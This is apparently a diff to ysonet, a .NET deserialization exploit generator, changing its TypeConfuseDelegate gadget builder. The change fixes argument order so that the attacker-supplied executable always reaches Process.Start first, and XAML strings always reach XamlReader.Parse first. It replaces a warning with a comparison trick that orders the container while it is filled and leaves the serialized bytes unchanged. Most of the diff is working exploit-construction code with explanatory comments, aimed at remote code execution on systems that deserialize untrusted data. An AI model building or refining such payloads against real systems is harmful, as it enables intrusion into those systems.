@@ -47,12 +47,16 @@ namespace ysonet.Generators
      * Process.Start. It shares BuildConfusedContainer, so it offers the same three
      * containers; its callers expose them as their own --rootcontainer option.
      *
-     * BuildConfusedContainer also takes the BENIGN Comparison<string> that fills slot 0.
-     * Both paths here pass CultureSensitiveCompare (String.Compare), which is what these
-     * shipped payloads have always used and what keeps them byte-identical. A gadget whose
-     * two strings have a REQUIRED order must pass OrdinalCompare instead, because that
-     * comparison sorts the container at BUILD time and therefore decides which string the
-     * spliced method receives first - see TypeConfuseDelegateFileOperationsGenerator.
+     * The order the two elements are serialized in is what decides which one the spliced
+     * method receives first, so BuildConfusedContainer fixes it rather than reading it off
+     * how the two strings sort: key1 is always written second and always arrives first.
+     * See FillOrderPuttingFirstArgumentLast for the mechanism and why it costs no bytes.
+     *
+     * BuildConfusedContainer also takes the BENIGN Comparison<string> that fills slot 0 and
+     * travels on the wire. Both paths here pass CultureSensitiveCompare (String.Compare),
+     * which is what these shipped payloads have always used and what keeps them
+     * byte-identical; TypeConfuseDelegateFileOperationsGenerator passes OrdinalCompare so the
+     * wire agrees with its own ordinal guard.
      */
     public class TypeConfuseDelegateGenerator : GenericGenerator
     {
@@ -619,7 +623,9 @@ namespace ysonet.Generators
         }
 
         // The command path's two elements ARE the two Process.Start arguments, so they come
-        // straight from the parsed command and can collide (see RejectEqualKeys).
+        // straight from the parsed command and can collide (see RejectEqualKeys). key1 is the
+        // executable and reaches Process.Start's first parameter whatever the two strings
+        // happen to sort like: BuildConfusedContainer fixes that order.
         private static object BuildCommandContainer(int container, InputArgs inputArgs)
         {
             ReadCommandFromFile(inputArgs);
@@ -627,43 +633,8 @@ namespace ysonet.Generators
             string key1 = inputArgs.CmdFileName;
             string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";
 
-            NoteIfArgumentsWillBeSwapped(inputArgs, key1, key2);
-
             return BuildConfusedContainer(container, CultureSensitiveCompare, ProcessStartSlot1(),
                 key1, key2, true);
-        }
-
-        // The command path is the one place where the sorted container's ordering rule is
-        // NOT enforced, only relied on. BuildConfusedContainer hands its LARGER element to
-        // the spliced method's first parameter, so Process.Start only receives the
-        // executable in parameter 1 while the executable sorts above the argument string.
-        //
-        // The default path is safe by construction: -c is wrapped as "cmd /c <command>",
-        // so the pair is "cmd" and "/c ...", and "/" sorts below "c". With --rawcmd that
-        // wrapper is gone, and a command like "notepad.exe zzz.txt" splits into two strings
-        // in the WRONG order, producing Process.Start("zzz.txt", "notepad.exe").
-        //
-        // Refusing that input would be the stronger fix, and it would cost no payload bytes
-        // (the check below uses the very comparison the container sorts with, so every
-        // currently-correct payload is untouched). It is a behavior change for existing
-        // scripts, though, so for now this only NOTES the problem - and only in debug mode,
-        // because ysonet is embedded by other tools whose wrappers merge stderr into the
-        // payload they capture. See dev-kitchen/todo/tcd-command-argument-order-unguarded.md.
-        //
-        // Deliberately strict "less than": an EQUAL pair is a different, already documented
-        // problem (containers 2 and 3 refuse it in RejectEqualKeys, container 1 collapses to
-        // one element and does not fire), and it needs its own message, not this one.
-        private static void NoteIfArgumentsWillBeSwapped(InputArgs inputArgs, string key1, string key2)
-        {
-            if (CultureSensitiveCompare(key1, key2) >= 0)
-                return;
-
-            Debugging.ShowNote(inputArgs,
-                "[TypeConfuseDelegate] The executable string sorts BELOW the argument string, "
-                + "so this payload calls Process.Start(\"" + key2 + "\", \"" + key1 + "\") - the "
-                + "two are swapped. The sorted container always hands its larger element to the "
-                + "first parameter. Drop --rawcmd (the 'cmd /c' wrapper always sorts correctly), "
-                + "or change the command so the executable sorts above its arguments.");
         }
 
         // The benign comparison the SHIPPED command and XAML payloads have always used.
@@ -688,24 +659,26 @@ namespace ysonet.Generators
         }
 
         // The shared body of every TypeConfuseDelegate payload, command path and XAML path
-        // alike. Builds the Comparison<string> combined with itself, wraps it in
-        // Comparer<string>.Create, fills the chosen sorted root with the two elements while
-        // the comparison is still benign, then swaps invocation-list slot 1 for the attacker
-        // delegate.
+        // alike. Builds a two-slot Comparison<string>, wraps it in Comparer<string>.Create,
+        // fills the chosen sorted root with the two elements while the comparison is still
+        // harmless, then swaps invocation-list slot 1 for the attacker delegate.
         //
         // container: 1 SortedSet (the original payload), 2 SortedDictionary, 3 TreeSet.
-        // benignComparison: the harmless Comparison<string> that fills invocation-list slot
-        //            0 and that the container sorts with WHILE IT IS BEING FILLED here. It
-        //            therefore decides the order the two elements are serialized in, which
-        //            is what decides the spliced method's argument order on the target. Use
-        //            CultureSensitiveCompare to keep an existing payload identical, or
-        //            OrdinalCompare when the caller must guarantee that order up front.
+        // benignComparison: the harmless Comparison<string> that fills invocation-list slot 0
+        //            and travels on the wire. It no longer decides the ORDER the two elements
+        //            are serialized in (see FillOrderPuttingFirstArgumentLast), but it is
+        //            still what defines an EQUAL pair here, and it is a visible part of the
+        //            payload: use CultureSensitiveCompare to keep an existing payload
+        //            byte-identical, or OrdinalCompare when the gadget's own guards are
+        //            ordinal and the wire should agree with them.
         // slot1:     the Delegate that replaces slot 1 (Func<string,string,Process> for the
         //            command path, Func<string,object> for the XAML path, an
         //            Action<string,string> for the file-operation path).
-        // key1/key2: the two elements. On deserialize the SMALLER-sorting one is inserted
-        //            first as the root and the larger is compared against it, so the larger
-        //            element becomes the spliced method's FIRST argument.
+        // key1/key2: the two elements. key1 is ALWAYS the spliced method's FIRST argument.
+        //            On deserialize the container inserts the first serialized element as the
+        //            root and compares the SECOND one against it, so the second serialized
+        //            element is the one that arrives first. FillOrderPuttingFirstArgumentLast
+        //            fixes that order here instead of leaving it to how the two strings sort.
         // keysMayCollide: true when the two elements come from user input and can compare
         //            equal, which containers 2 and 3 must refuse (see RejectEqualKeys). The
         //            XAML path passes false: its elements are the XAML string and "", and a
@@ -722,8 +695,11 @@ namespace ysonet.Generators
             if (benignComparison == null)
                 throw new ArgumentNullException("benignComparison");
 
-            Delegate da = benignComparison;
-            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
+            // Slot 0 is the benign comparison the finished payload carries. Slot 1 only orders
+            // the container while it is filled HERE, and SpliceSlot1 overwrites it with the
+            // attacker delegate before anything is serialized.
+            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(
+                benignComparison, FillOrderPuttingFirstArgumentLast(benignComparison, key1));
             IComparer<string> comp = Comparer<string>.Create(d);
 
             if (keysMayCollide && container != 1)
@@ -768,6 +744,39 @@ namespace ysonet.Generators
             return root;
         }
 
+        // Which of the two elements reaches the spliced method's first parameter is decided
+        // by the order they are SERIALIZED in, and that order is decided by the comparison
+        // used while the container is filled here. Left to the strings themselves it is luck:
+        // the default -c path is safe by construction ("cmd" and "/c ...", and "/" sorts below
+        // "c"), but --rawcmd removes that wrapper, and a command like "notepad.exe zzz.txt"
+        // sorts the executable BELOW its argument. That used to produce
+        // Process.Start("zzz.txt", "notepad.exe") - a payload that generates, deserializes and
+        // does the wrong thing.
+        //
+        // So the order is fixed here rather than observed. A multicast Comparison returns the
+        // result of the LAST method in its invocation list, which is slot 1 - the very slot
+        // SpliceSlot1 overwrites with the attacker delegate afterwards. An ordering placed
+        // there therefore decides the serialized order and leaves nothing on the wire: the
+        // payload still carries [benign comparison, attacker delegate], and its bytes are
+        // unchanged for every pair that already sorted the right way round. The hand-built
+        // minified NRBF stream in Generate has always written its two strings in this fixed
+        // order; this is the same rule for the object graph.
+        //
+        // Equality still comes from the benign comparison, so a container that collapses or
+        // refuses a duplicate key (SortedSet, RejectEqualKeys) behaves exactly as before.
+        private static Comparison<string> FillOrderPuttingFirstArgumentLast(
+            Comparison<string> benignComparison, string firstArgument)
+        {
+            return delegate(string x, string y)
+            {
+                if (benignComparison(x, y) == 0)
+                    return 0;
+                // The element that must arrive as argument 1 sorts LAST, so the container
+                // serializes it second and the target compares it against the root.
+                return String.Equals(x, firstArgument, StringComparison.Ordinal) ? 1 : -1;
+            };
+        }
+
         // Direct SoapFormatter form for the normal CLR4 gadget. The target sees the same
         // native SortedSet<string>/TreeSet<string> -> ComparisonComparer<string> graph as
         // the other formatters. No Workflow surrogate, outer carrier, or nested formatter
@@ -780,7 +789,6 @@ namespace ysonet.Generators
             ReadCommandFromFile(inputArgs);
             string key1 = inputArgs.CmdFileName;
             string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";
-            NoteIfArgumentsWillBeSwapped(inputArgs, key1, key2);
 
             return SerializeSoapContainer(container, CultureSensitiveCompare,
                 ProcessStartSlot1(), key1, key2, true, inputArgs);
@@ -809,11 +817,14 @@ namespace ysonet.Generators
             // A real SortedSet collapses equal values while ysonet fills it. Keep that
             // established variant-1 behavior rather than letting the authored document
             // invent a second item and an effect the ordinary object graph does not have.
+            //
+            // Otherwise key1 is written SECOND, because the target compares the second element
+            // against the first and hands it to the spliced method as argument 1. The object
+            // graph fixes the same order (FillOrderPuttingFirstArgumentLast), so both forms of
+            // this gadget place the executable identically.
             string[] items = order == 0
                 ? new string[] { key1 }
-                : (order < 0
-                    ? new string[] { key1, key2 }
-                    : new string[] { key2, key1 });
+                : new string[] { key2, key1 };
 
             var root = new SoapSetProxy(comparer, items);
 
@@ -1089,9 +1100,12 @@ namespace ysonet.Generators
         // variants: a binder or blocklist that rejects the exact wire type name
         // System.Collections.Generic.SortedSet.
         //
-        // The two elements are the XAML document and "", so unlike the command path they
-        // can never collide: "" sorts smallest, which also makes the XAML string the
-        // larger element and therefore the FIRST argument handed to XamlReader.Parse.
+        // The two elements are the XAML document and "", so unlike the command path they can
+        // never collide: a XAML document is never empty. key1 is the document, and the builder
+        // always writes key1 second, so it is the FIRST argument handed to XamlReader.Parse.
+        // (That was already true when the order came from the strings, because "" sorts
+        // smallest, which is why these payloads are byte-identical to the ones ysonet has
+        // always produced.)
         public static object GetXamlGadget(string xaml_payload, int container)
         {
             Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
@@ -1133,7 +1147,8 @@ namespace ysonet.Generators
             + "a binder or blocklist that rejects the exact SortedSet wire type name. "
             + "SoapFormatter supports 1 and 3, not 2. Not "
             + "used by the TextFormattingRunProperties wrapper (variant 2), which has no "
-            + "container.";
+            + "container. The (2) formatter annotation counts wrapper variants, not "
+            + "root-container choices.";
 
         // Shared strict parser for that option. Not the usual
         // int.TryParse(v, out container) shortcut: that silently turns "nope" or "9" into
